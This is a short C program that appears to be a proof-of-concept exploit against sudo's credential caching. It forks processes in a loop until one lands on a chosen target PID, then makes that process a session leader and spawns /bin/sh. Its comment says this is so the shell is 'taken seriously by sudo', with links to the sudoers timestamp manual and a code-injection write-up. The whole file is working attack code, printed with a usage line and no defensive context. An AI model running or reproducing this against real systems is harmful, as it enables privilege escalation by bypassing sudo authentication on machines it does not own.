#include <stdio.h>
#include <unistd.h>
#include <sys/types.h>
#include <stdlib.h>
#include <sys/wait.h>

#define SHELL "/bin/sh"

/* https://www.sudo.ws/man/1.8.25/sudoers_timestamp.man.html */

/* https://blog.gdssecurity.com/labs/2017/9/5/linux-based-inter-process-code-injection-without-ptrace2.html */

int main(int ac, char **av) {
	if (ac <= 1) {
		printf("Usage: %s [pid to target]\n", av[0]);
		return 1;
	}
	pid_t pid_target = atoi(av[1]);
	pid_t pid = getpid();

	while (pid != pid_target) {
		pid = fork();
		if (pid == -1) {
			return 1;
		}
		if (pid == 0) {
			pid = getpid();
			if (pid != pid_target) {
				exit(1);
			}
			else {
				printf("[+] SHELLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLL\n");
				setsid(); // be session leader to be taken seriously by sudo
				setpgid(0, 0);
				execlp(SHELL, SHELL, NULL);
				printf("ERROR: execlp Failed\n");
			}
		} else {
			printf("pid = %d\n", pid);
			int wstatus = 0;
			waitpid(pid, &wstatus, 0);
		}
	}
	/* printf("[+] PID Found\n"); */
	/* execlp(SHELL, SHELL, NULL); */
	return 0;
}
